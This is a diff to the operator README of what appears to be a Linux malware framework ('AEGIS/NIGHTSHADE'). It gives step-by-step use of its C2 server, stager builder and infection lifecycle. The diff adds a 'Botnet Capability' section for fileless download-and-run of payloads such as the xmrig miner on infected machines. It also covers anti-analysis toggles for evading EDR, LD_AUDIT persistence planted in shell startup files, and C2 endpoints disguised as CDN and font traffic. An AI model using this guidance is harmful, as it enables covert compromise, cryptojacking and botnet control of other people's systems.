@@ -29,52 +29,63 @@ The framework operates on a strict asymmetric model. The "Infected Machine" (Tar
 
 ## 3. C2 Station Setup
 
-The C2 Station is responsible for generating unique stager binaries and listening for incoming beacons.
+The AEGIS/NIGHTSHADE framework includes a Python-based C2 server (`c2_server/server.py`) that handles listener duties, agent management, and payload distribution.
 
 ### 3.1. Prerequisites
 - **OS:** Linux (Debian/Ubuntu recommended for compatibility)
 - **Tools:** Python 3.8+, GCC/Clang, OpenSSL (`libssl-dev`), Make.
 - **Network:** Publicly accessible IP or Domain (for production), or local network for testing. Port 443 must be open.
 
-### 3.2. Stager Generation
-Every deployment requires a unique, polymorphic stager. NEVER reuse a stager binary.
-
-1.  **Navigate to the framework root.**
-2.  **Generate Stagers:**
-    Use the included engine to produce mutated binaries.
+### 3.2. Starting the C2 Server
+1.  Navigate to the repository root.
+2.  Start the server (requires root for port 443, or use a high port like 4443 and proxy via iptables):
     ```bash
-    make generate
+    sudo python3 c2_server/server.py
     ```
-    *Output:* `build/polymorphic_stager_0` to `_4`.
-    *Logs:* Check `build/gen_logs/` for mutation details and hashes.
+3.  The server will generate self-signed TLS certificates (`server.pem`) on first run if they don't exist.
 
-    *Note:* The generation engine applies random junk code, identifier renaming, and opaque predicates. If a build fails (rare), the engine automatically retries.
+**Menu Options:**
+*   **[1] List Agents:** Show active Alpha nodes, their IP addresses, and last check-in times.
+*   **[2] Interact with Agent:** Send tasks to a specific agent (Shellcode execution, Payload Injection).
+*   **[3] Payload Builder:** Configure Anti-Analysis checks and compile stagers.
+*   **[4] Advanced Configuration:** Modify core C2 parameters (Beacon intervals, thresholds) in `common/config.h`.
+*   **[5] Start Listener:** Starts the background HTTPS listener thread (automatically started on launch).
 
-### 3.3. Listener Configuration (Server-Side)
-*Note: The server-side listener code is distinct from this repository. Ensure your listener adheres to the following protocol:*
+### 3.3. Stager Generation (Payload Builder)
+Use Option **[3]** in the C2 menu to generate stagers.
 
-*   **Protocol:** HTTPS (TLS 1.3 required).
-*   **Certificates:** Use valid certificates (Let's Encrypt) to blend with legitimate traffic. Self-signed certs are acceptable for testing but increase detection risk.
-*   **Endpoints:**
-    *   `POST /api/v1/assets/*/upload` -> **Beacon** (Heartbeat & Task Request).
-    *   `POST /cdn/dist/*/bundle.js` -> **Stage Delivery** (Serves the Ghost Loader).
-    *   `POST /static/fonts/*.woff2` -> **Payload Delivery** (Serves the main encrypted payload).
-    *   `POST /api/telemetry/*` -> **Exfiltration** (Receives task results/files).
-*   **Response Format:** All server responses must be wrapped in the `aegis_c2_envelope_t` structure (Magic + Sequence + IV + Encrypted Data + Tag).
+*   **Toggle Checks:** You can enable/disable individual Anti-Analysis checks (e.g., PTRACE, RDTSC) for granular testing.
+*   **Build Stager (Standard):** Compiles the stager with the currently selected AA configuration.
+*   **Build Stager (CLEAN / No-AA):** Compiles a "clean" stager with **AEGIS_DISABLE_AA** set. This binary contains *zero* anti-analysis code or imports, useful for baseline testing against EDRs.
+
+*Output:* `build/aegis_stager`.
+
+### 3.4. Payload Injection (Botnet Capability)
+The C2 server can instruct agents to download and execute arbitrary ELF binaries filelessly (e.g., Xmrig, CCminer).
+
+1.  **Prepare Payloads:** Place your ELF binaries in the `payloads/` directory (created automatically on server start).
+    *   Example: `cp xmrig payloads/xmrig`
+2.  **Interact:** Select Option **[2]** in the C2 menu and choose an agent.
+3.  **Inject:** Select Option **[2] (Inject Payload)**.
+4.  **Execute:** Enter the filename (e.g., `xmrig`).
+    *   The C2 queues a task.
+    *   Agent retrieves the binary via encrypted channel.
+    *   Agent executes it via `memfd_create` + `fexecve`.
+    *   Agent wipes the memory buffer immediately after execution starts.
 
 ---
 
 ## 4. Target Implantation (Infected Machine)
 
 ### 4.1. Execution Vectors
-Deploy the generated stager (`build/polymorphic_stager_X`) to the target.
-*   **Manual:** `chmod +x stager; ./stager`
+Deploy the generated stager (`build/aegis_stager`) to the target.
+*   **Manual:** `chmod +x aegis_stager; ./aegis_stager`
 *   **Exploit Chain:** Drop and execute via remote code execution.
 *   **Persistence:** The stager is designed to run *once*. It implants the system and then **self-destructs**.
 
 ### 4.2. The Infection Lifecycle
 1.  **Stager Execution:**
-    *   Runs anti-analysis checks (VM, Debugger, Sandbox).
+    *   Runs anti-analysis checks (unless disabled via C2).
     *   Beacons to C2.
     *   Downloads "Ghost Loader" into memory.
     *   Executes Ghost Loader via `memfd_create` (Fileless).
@@ -84,7 +95,7 @@ Deploy the generated stager (`build/polymorphic_stager_X`) to the target.
     *   Injects `export LD_AUDIT=...` into `~/.bashrc`, `~/.zshrc`, etc.
 3.  **Persistence (LD_AUDIT):**
     *   Every new process spawned by the user loads `nexus_auditor.so`.
-    *   **Alpha Node:** The first process (via `flock`) becomes the controller.
+    *   **Alpha Node:** The first process (via `flock`) becomes the controller and C2 worker.
     *   **Beta Nodes:** Subsequent processes become workers.
 
 ### 4.3. Artifacts & Footprint
@@ -101,7 +112,7 @@ Deploy the generated stager (`build/polymorphic_stager_X`) to the target.
 
 ## 5. Configuration Guide
 
-To customize the framework for a specific campaign, modify `common/config.h` **before** compiling.
+To customize the framework for a specific campaign, you can modify `common/config.h`. This can now be done interactively via the C2 Server's **Advanced Configuration** menu.
 
 ### 5.1. C2 Connectivity
 *   `AEGIS_C2_PRIMARY_HOST`: Your C2 domain.
